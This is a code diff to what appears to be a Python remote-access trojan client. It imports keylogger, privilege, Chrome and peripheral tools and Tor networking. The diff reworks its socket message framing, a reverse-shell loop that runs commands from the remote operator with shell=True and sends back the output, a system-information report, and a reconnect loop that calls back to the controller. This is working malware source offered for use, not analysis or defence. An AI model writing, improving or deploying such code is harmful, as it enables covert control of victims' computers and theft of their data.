@@ -12,6 +12,7 @@ from mss import mss
 # import cv2
 #importing tor network
 from tor_network import ClientSocket, Tor
+import time
 
 # Local tools to the application
 from tools import keylogger,privilege,chrome,peripherals
@@ -20,19 +21,46 @@ ENCODING = 'utf-8'
 
 
 def reliable_send(data):
-    jsondata = json.dumps(data)
-    s.send(jsondata.encode(ENCODING))
+    try:
+        json_data = json.dumps(data)
+        length = len(json_data)
+        length_header = f"{length:<10}".encode()  # Fixed length header
+        s.send(length_header)
+        s.send(json_data.encode())
+    except Exception as e:
+        print(f"Error sending data: {e}")
+        raise
 
 def reliable_recv():
-    data = ''
-    while True:
+    try:
+        # First receive the length header
+        length_header = s.recv(10).decode().strip()
+        if not length_header:
+            return None
+        
+        # Convert length header to int
+        length = int(length_header)
+        
+        # Receive the actual data
+        chunks = []
+        bytes_received = 0
+        while bytes_received < length:
+            chunk = s.recv(min(length - bytes_received, 4096))
+            if not chunk:
+                return None
+            chunks.append(chunk)
+            bytes_received += len(chunk)
+        
+        data = b''.join(chunks).decode()
+        
         try:
-            data = data + s.recv(1024).decode(ENCODING).rstrip()
             return json.loads(data)
-        except ValueError:
-            continue
-        except socket.error:
-            raise()
+        except json.JSONDecodeError:
+            return data.strip()
+            
+    except Exception as e:
+        print(f"Error receiving data: {e}")
+        raise
 
 
 def download_file(file_name):
@@ -207,36 +235,45 @@ def shell():
     while True:
         try:
             command = reliable_recv()
+            if not command:
+                break
+                
             if command == 'quit':
                 break
             elif command == 'sysinfo':
-                reliable_send(get_system_info())
-            elif command[:3] == 'cd ':
+                info = {
+                    'os': platform,
+                    'hostname': socket.gethostname(),
+                    'username': os.getlogin(),
+                    'is_admin': is_admin()
+                }
+                reliable_send(info)
+            elif command.startswith('cd '):
                 try:
                     os.chdir(command[3:])
-                    reliable_send(os.getcwd())
+                    reliable_send({'success': True, 'cwd': os.getcwd()})
                 except Exception as e:
-                    reliable_send(str(e))
+                    reliable_send({'error': str(e)})
             else:
-                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                       stdin=subprocess.PIPE)
-                result = execute.stdout.read() + execute.stderr.read()
+                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
+                                     stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                result = proc.stdout.read() + proc.stderr.read()
                 reliable_send(result.decode())
+                
         except Exception as e:
-            reliable_send(str(e))
+            reliable_send({'error': str(e)})
+            continue
 
 def connect():
     while True:
-        timeout = 30
         try:
-            global s
-            s = clientsock.create_connection()
+            s.connect((HOST, PORT))
             shell()
-            s.close()
             break
-        except socket.error as err:
-            print(err)
-            connect()
+        except Exception as e:
+            print(f"Connection error: {e}")
+            time.sleep(5)  # Wait before retrying
+            continue
 
 tor = Tor()
 onion, port = tor.read_address_from_binary()
